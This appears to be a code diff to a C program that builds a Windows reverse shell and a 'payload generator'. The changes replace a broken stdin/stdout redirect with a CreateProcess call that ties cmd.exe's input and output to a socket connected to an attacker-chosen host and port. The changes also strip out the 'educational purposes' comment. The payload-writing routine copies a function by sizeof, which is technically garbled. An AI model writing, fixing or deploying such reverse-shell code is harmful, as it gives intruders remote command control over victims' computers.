@@ -2,16 +2,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <winsock2.h>
+#include <windows.h>
 
 #pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library
 
-// Simple reverse shell in C (manually generated for educational purposes)
-// This shellcode connects to a given IP and port, then spawns a shell (cmd.exe)
 void reverse_shell(const char* lhost, const int lport) {
     WSADATA wsaData;
     SOCKET sock;
     struct sockaddr_in server;
-    char *msg = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    char *cmd = "cmd.exe";
 
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -36,15 +37,29 @@ void reverse_shell(const char* lhost, const int lport) {
         return;
     }
 
-    // Redirect stdin, stdout, and stderr to the socket
-    dup2(sock, 0);  // stdin
-    dup2(sock, 1);  // stdout
-    dup2(sock, 2);  // stderr
+    // Initialize the STARTUPINFO structure
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
 
-    // Spawn a shell (cmd.exe on Windows)
-    _execvp("cmd.exe", NULL);
+    // Create a new process to run cmd.exe
+    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        printf("CreateProcess failed\n");
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
 
-    closesocket(sock);  // Close the socket
+    // Wait for the process to finish
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Clean up
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    closesocket(sock);
     WSACleanup();  // Clean up Winsock
 }
 
@@ -64,8 +79,7 @@ void generate_payload(const char *lhost, const char *lport, const char *output_f
     fprintf(f, "Generated reverse shell payload\n");
     fprintf(f, "LHOST: %s\nLPORT: %s\n", lhost, lport);
 
-    // Write a simple C reverse shell payload into the file
-    // Here we compile and inject the reverse shell code directly
+    // Write the reverse shell code into the file
     fwrite(reverse_shell, sizeof(reverse_shell), 1, f);
 
     fclose(f);
